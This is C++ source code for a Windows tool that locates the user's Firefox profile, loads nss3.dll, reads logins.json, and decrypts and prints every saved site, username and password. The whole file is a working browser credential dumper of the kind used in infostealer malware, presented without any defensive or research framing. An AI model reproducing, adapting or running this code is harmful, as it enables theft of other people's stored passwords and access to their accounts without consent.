#include <Windows.h>
#include <stdio.h>
#include <string>
//#include <fstream>
#include <shlobj_core.h>
#include <regex>

///////////////////////////////////////////
/////////  Structs and typedefs
typedef enum {
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer = 2,
	siDERCertBuffer = 3,
	siEncodedCertBuffer = 4,
	siDERNameBuffer = 5,
	siEncodedNameBuffer = 6,
	siAsciiNameString = 7,
	siAsciiString = 8,
	siDEROID = 9,
	siUnsignedInteger = 10,
	siUTCTime = 11,
	siGeneralizedTime = 12,
	siVisibleString = 13,
	siUTF8String = 14,
	siBMPString = 15
} SECItemType;

typedef struct SECItemStr SECItem;

struct SECItemStr {
	SECItemType type;
	unsigned char *data;
	unsigned int len;
};

typedef enum _SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
} SECStatus;

typedef unsigned int PRUint32;//For PL_Base64Decode
typedef void PK11SlotInfo; // For PK11_Authenticate
typedef int PRBool; // For PK11_Authenticate

///////////////////// Dynamic Func Defines
typedef SECStatus (*fpNSS_Init)(const char *configdir);
typedef char *(*fpPL_Base64Decode)(const char *src, PRUint32 srclen, char *dest);
typedef SECStatus(*fpPK11SDR_Decrypt)(SECItem *data, SECItem *result, void *cx);
typedef SECStatus(*fpPK11_Authenticate)(PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef PK11SlotInfo *(*fpPK11_GetInternalKeySlot)();
typedef void (*fpPK11_FreeSlot)(PK11SlotInfo *slot);
typedef SECStatus(*fpNSS_Shutdown)();

//////////////////// Global Functions
fpNSS_Init NSS_Init;
fpPL_Base64Decode PL_Base64Decode;
fpPK11SDR_Decrypt PK11SDR_Decrypt;
fpPK11_Authenticate PK11_Authenticate;
fpPK11_GetInternalKeySlot PK11_GetInternalKeySlot;
fpPK11_FreeSlot PK11_FreeSlot;
fpNSS_Shutdown NSS_Shutdown;

//////////////////// Other functions
unsigned char * decrypt(std::string);
size_t char_count(const char *, size_t, const char);

int main(int argc, char**argv) {
	const char nssLibraryName[] = "nss3.dll";
	
	char *programFilesPath = (char *)malloc(sizeof(char)*MAX_PATH);
	char *appDataPath = (char *)malloc(sizeof(char)*MAX_PATH);
	SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, 0, NULL, programFilesPath);
	SHGetFolderPathA(NULL, CSIDL_APPDATA, 0, NULL, appDataPath);

	std::string sProgramFilesPath = programFilesPath ;
	sProgramFilesPath = sProgramFilesPath + "\\Mozilla Firefox";
	SetCurrentDirectory(sProgramFilesPath.c_str());


	HMODULE nssLib = LoadLibrary(nssLibraryName);
	if (nssLib == NULL) {
		printf("Library couldnt loaded!.. %d\n",GetLastError());
		system("PAUSE");
		return -1;
	}
	std::string profileName = "";
	std::string sAppDataPath = appDataPath;
	sAppDataPath = sAppDataPath + "\\Mozilla\\Firefox\\Profiles\\";
	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile((sAppDataPath+"\\*").c_str(), &ffd);
		do {
			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (strlen(ffd.cFileName) > 2) {
					profileName = ffd.cFileName;
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);
	//printf("appdata: %s\n", sAppDataPath.c_str());
	
	std::string profilePath = sAppDataPath + profileName;

	NSS_Init = (fpNSS_Init) GetProcAddress(nssLib, "NSS_Init");
	PL_Base64Decode = (fpPL_Base64Decode)GetProcAddress(nssLib, "PL_Base64Decode");
	PK11SDR_Decrypt = (fpPK11SDR_Decrypt)GetProcAddress(nssLib, "PK11SDR_Decrypt");
	PK11_Authenticate = (fpPK11_Authenticate)GetProcAddress(nssLib, "PK11_Authenticate");
	PK11_GetInternalKeySlot = (fpPK11_GetInternalKeySlot)GetProcAddress(nssLib, "PK11_GetInternalKeySlot");
	PK11_FreeSlot = (fpPK11_FreeSlot)GetProcAddress(nssLib, "PK11_FreeSlot");
	NSS_Shutdown = (fpNSS_Shutdown)GetProcAddress(nssLib, "NSS_Shutdown");


	SECStatus s = NSS_Init(profilePath.c_str());
	if (s != SECSuccess) {
		printf("Error when initialization!\n");
	}

	profilePath = profilePath + "\\logins.json";
	
	DWORD szBuffer = 8192,szWrotedBytes;
	char *buffer = (char *)malloc(szBuffer);
	HANDLE fLoginFile = CreateFileA(profilePath.c_str(), GENERIC_READ, 
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fLoginFile != INVALID_HANDLE_VALUE) {
		ReadFile(fLoginFile, buffer, szBuffer, &szWrotedBytes, NULL);
		//printf("%s,\n", buffer);
	}
	else {
		printf("File cannot found!..\n");
	}
	std::string loginStrings = buffer;
	std::regex re("\"hostname\":\"([^\"]+)\"");
	std::regex reUsername("\"encryptedUsername\":\"([^\"]+)\"");
	std::regex rePassword("\"encryptedPassword\":\"([^\"]+)\"");
	std::smatch match;
	std::string::const_iterator searchStart(loginStrings.cbegin());
	while (std::regex_search(searchStart,loginStrings.cend(), match, re)) {
			printf("Host\t: %s \n", match.str(1).c_str());
			std::regex_search(searchStart, loginStrings.cend(), match, reUsername);
			printf("Username: %s \n", decrypt(match.str(1)));
			std::regex_search(searchStart, loginStrings.cend(), match, rePassword);
			printf("Password: %s \n",decrypt( match.str(1)));
			searchStart += match.position() + match.length();
			printf("-----------------------------------------\n");
	}
	
	NSS_Shutdown();

	system("PAUSE");
	return 0;
}

unsigned char * decrypt(std::string encryptedString) {
	size_t szDecoded = encryptedString.size() / 4 * 3 - char_count(encryptedString.c_str(), encryptedString.size(), '=');
	char *chDecoded = (char *)malloc(szDecoded+1);
	memset(chDecoded, NULL, szDecoded+1);

	SECItem encrypted, decrypted;
	encrypted.data = (unsigned char *)malloc(szDecoded + 1);
	encrypted.len = szDecoded;
	memset(encrypted.data, NULL, szDecoded + 1);

	if (PL_Base64Decode(encryptedString.c_str(), encryptedString.size(), chDecoded)) {
		memcpy(encrypted.data, chDecoded, szDecoded);
		PK11SlotInfo *objSlot = PK11_GetInternalKeySlot();
		if (objSlot) {
			if (PK11_Authenticate(objSlot, TRUE, NULL) == SECSuccess) {
				SECStatus s = PK11SDR_Decrypt(&encrypted, &decrypted, nullptr);
				//printf("%s ----- %d\n", decrypted->data, s);
			}
			else {
				printf("Auth err!\n");
			}
		}
		else {
			printf("OBJ err!\n");
		}
		PK11_FreeSlot(objSlot);
	}
	unsigned char *temp = (unsigned char *)malloc(decrypted.len + 1);
	temp[decrypted.len] = NULL;
	memcpy(temp, decrypted.data, decrypted.len);

	return temp;
}

size_t char_count(const char *str,size_t size,const char ch) {
	size_t count = 0;
	for (size_t i = size - 1; i > size - 4; i--) {
		if (str[i] == ch)
			count++;
		else
			break;
	}
	return count;
}